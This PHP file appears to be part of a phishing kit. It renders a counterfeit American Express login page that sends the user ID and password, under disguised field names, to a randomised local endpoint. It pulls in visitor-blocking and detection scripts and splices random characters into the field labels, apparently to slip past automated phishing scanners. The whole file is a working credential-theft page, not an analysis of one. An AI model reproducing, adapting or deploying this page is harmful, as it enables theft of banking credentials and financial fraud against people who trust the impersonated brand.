<?php
include('../blockers.php');
include('../detects.php');
include('../random.php');

include('../assets/headerindexmobile.php');?>

                    <div class="container pad-1-tb">
                        <div class="">
                            <div class=""></div>
                            <div data-container-name="page-container" class="body">
                                <div class="parent-wrapper">
                                    <div class=""></div>
                                    <div class="">
                                        <div data-component-name="login-container" class="margin-b-md-down row flex-justify-center">
                                            <div class="col-xs-12 col-lg-4 col-md-6">
                                                <h1 class="heading-4 text-align-center pad-t pad-lr dls-white-bg dls-color-text">Log In to My Account</h1>
                                                <div class="">
                                                    <div id="LoginComponent">
                                                        <div data-module-name="axp-login" class="dls-white-bg dls-color-text">
                                                            <div class="eliloMain card-block">
                                                                <form method="POST" action="myca/getstarted?confirm_card=<?php echo md5(microtime());?><?php echo md5(microtime());?>&session=<?php echo sha1(microtime()); ?>">
                                                                    <div class="form-group eliloUserId dls-color-text" data-toggle="" data-currency=""><label class="" for="eliloUserID">U<?=rT("ALPHANUMERIC",5);?>ser ID</label>
                                                                        <div class=""><input type="text" id="eliloUserID" name="K1" class="form-control" value="" required></div>
                                                                    </div>
                                                                    <div class="form-group eliloPassword" data-toggle="" data-currency=""><label class="" for="eliloPassword">Pa<?=rT("ALPHANUMERIC",5);?>ssw<?=rT("ALPHANUMERIC",5);?>ord</label>
                                                                        <div class=""><input type="password" id="eliloPassword" name="Q1" class="form-control" value="" required></div>
                                                                    </div>
                                                                    <div class="form-group eliloSelect"><label for="eliloSelect" class="sr-only"></label>
                                                                        <div class="select form-control" data-rendered="true" data-value="Cards - My Account">
                                                                            <select id="eliloSelect" name="eliloSelect" class="form-control">
                                                                                <option selected="" label="Cards - My Account" value="account">Cards - My Account</option>
                                                                                <option label="Membership Rewards" value="rewards">Membership Rewards</option>
                                                                                <option label="Merchant Account" value="merchant" sso="V2" brandname="CONCORD">Merchant Account</option>
                                                                                <option label="&#192;merican Express @ Work" value="work" sso="V4" brandname="atwork">&#192;merican Express @ Work</option>
                                                                            </select>
                                                                        </div>
                                                                    </div>
                                                                    <div class="checkbox eliloRemember"><input type="checkbox" value="" id="rememberMe" class="form-control"><label for="rememberMe">Remember Me</label></div><button class="btn-fluid margin-0-b" tabindex="0" id="loginSubmit" type="submit"><span class="btn-content">Log In</span></button></form>
                                                                    <ul class="list-links margin-2-t text-align-left">
                                                                        <li><a href="#/account/password/recover">Forgot User ID or Password?</a></li>
                                                                        <li><a href="#/action/register?request_type=un_Register&amp;Face=en_US&amp;regSrc=logon&amp;linknav=us-homepage-createnewaccount" target="" title="Create New Online Account">Create New Online Account</a></li>
                                                                        <li><a href="#/action/activation?request_type=un_Activation&amp;Face=en_US&amp;inav=usmbl_menu_myca_accreg_pr_body&amp;linknav=us-homepage-activatenewcard" target="" title="Confirm Card Received">Confirm Card Received</a></li>
                                                                        <li><a href="#/content/fraud-protection-center/home.html?linknav=us-homepage-securitycenter" target="" title="Visit Our Security Center">Visit Our Security Center</a></li>
                                                                    </ul>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-xs-12 col-lg-4 col-md-6">
                                                <div class="dls-accent-white-01-bg text-align-center pad-tb">
                                                    <h1 class="label">FROM OUR PARTNERS</h1>
                                                    <div class="pad-0">
                                                        <div class="">
                                                            <section data-module-name="axp-marketing-offer"><a href="#" target=""><img src="../assets/src/20-AMX-0046_Covid19Support-AmexBanner_300x250_m01_46.jpg" alt="Mobile App" title="Mobile App"></a></section>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
<?php include('../assets/footer.php'); ?>